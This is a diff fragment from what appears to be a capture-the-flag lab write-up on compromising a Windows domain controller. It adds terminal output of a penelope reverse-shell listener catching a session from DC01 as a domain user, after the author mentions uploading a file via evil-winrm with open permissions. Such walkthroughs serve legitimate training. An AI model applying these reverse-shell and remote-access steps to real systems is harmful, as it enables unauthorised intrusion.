@@ -530,4 +530,22 @@ evil-winrm-py PS C:\ProgramData\UpdateMonitor>
 
 Ill upload it and grant all users full control over the file so it can be unzipped
 
+```python
+❯❯❯ penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC01 10.129.245.130 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 logging\jaylee.clifton 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC01~10.129.245.130-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_06-20_23_18-149.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32>whoami
+whoami
+logging\jaylee.clifton
+
+C:\Windows\system32>
+```
+
+Then after a few minutes i get a connection back
+
 
